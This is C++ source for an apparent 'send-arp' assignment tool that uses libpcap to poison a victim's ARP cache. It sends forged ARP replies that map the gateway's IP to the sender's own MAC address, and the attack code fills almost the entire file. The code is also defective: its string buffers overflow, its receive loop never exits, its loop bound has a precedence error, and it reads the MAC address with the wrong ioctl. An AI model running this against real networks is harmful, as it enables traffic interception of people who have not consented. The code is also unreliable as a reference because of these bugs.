#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
//ip_addr
#include <stdint.h>
#include <stdio.h>
#include<stdlib.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <arpa/inet.h>
//mac addr
#include <netinet/ether.h>
//send_packet
#include <libnet.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

char* my_ip(){
	struct ifreq ifr;
	char* ipstr = (char*)malloc(sizeof(char*));
	int s;
	
	s = socket(AF_INET,SOCK_DGRAM,0);
	strncpy(ifr.ifr_name,"eth0",IFNAMSIZ);

	if(ioctl(s,SIOCGIFADDR,&ifr)<0){
		printf("Error");
		return NULL;
	}else{
		inet_ntop(AF_INET,ifr.ifr_addr.sa_data+2,ipstr,sizeof(struct sockaddr));
		return ipstr;
	}
	return NULL;
}
char* my_mac(){
	int sock;
	struct ifreq ifr;
	char* mac_addr = (char*)malloc(sizeof(char*));

	sock = socket(AF_INET,SOCK_DGRAM,0);
	if(sock<0){
		return NULL;
	}
	else{
		ifr.ifr_addr.sa_family = AF_INET;
		strncpy(ifr.ifr_name,"eth0",IFNAMSIZ-1);
		if(ioctl(sock,SIOCGIFADDR,&ifr)<0){
			printf("error");
			return NULL;
		}else{
			sprintf(mac_addr,"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",(unsigned char)ifr.ifr_hwaddr.sa_data[0],(unsigned char)ifr.ifr_hwaddr.sa_data[1],(unsigned char)ifr.ifr_hwaddr.sa_data[2],(unsigned char)ifr.ifr_hwaddr.sa_data[3],(unsigned char)ifr.ifr_hwaddr.sa_data[4],(unsigned char)ifr.ifr_hwaddr.sa_data[5]);
			return mac_addr;
		}
	}
}

int main(int argc, char* argv[]) {
	if (argc <4 || argc %2 ==1) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	for(int i=0;i<argc-1/2;i++){
		//get ip_addr
		char* myip;
		myip = my_ip();
		printf("my ip : %s\n",myip);
		//get mac_addr
		char* mymac;
		mymac = my_mac();
		printf("my mac : %s\n",mymac);
		//get MAC of gateway & You
		char* youip = argv[2*i+2];
		char* gateip = argv[2*i+3];
		printf("you ip : %s\n",youip);
		printf("gate ip : %s\n",gateip);

		struct pcap_pkthdr* header;
		EthArpPacket s_packet;
		s_packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
		s_packet.eth_.smac_ = Mac(mymac);
		s_packet.eth_.type_ = htons(EthHdr::Arp);
		s_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		s_packet.arp_.pro_ = htons(EthHdr::Ip4);
		s_packet.arp_.hln_ = Mac::SIZE;
		s_packet.arp_.pln_ = Ip::SIZE;
		s_packet.arp_.op_ = htons(ArpHdr::Request);
		s_packet.arp_.smac_ = Mac(mymac);
		s_packet.arp_.sip_ = htonl(Ip(myip));
		s_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		s_packet.arp_.tip_ = htonl(Ip(youip));
		//send packet for "you"
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&s_packet), sizeof(EthArpPacket));
		Mac youmac;
		while(true){
			const u_char* r_packet;
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			//receive packet
			res = pcap_next_ex(handle,&header,&r_packet);
			if(res == 0) continue;
			if(res == -1 || res == -2){
				printf("PCAP_next_ex return %d(%s)\n",res,pcap_geterr(handle));
			}
			struct EthArpPacket *pkt = (EthArpPacket*)r_packet;
			youmac = pkt->eth_.smac_;

		}
		EthArpPacket packet;
		packet.eth_.dmac_ = youmac;
		packet.eth_.smac_ = Mac(mymac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = Mac(mymac);
		packet.arp_.sip_ = htonl(Ip(gateip));
		packet.arp_.tmac_ = youmac;
		packet.arp_.tip_ = htonl(Ip(youip));

		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		pcap_close(handle);
	}
	
}
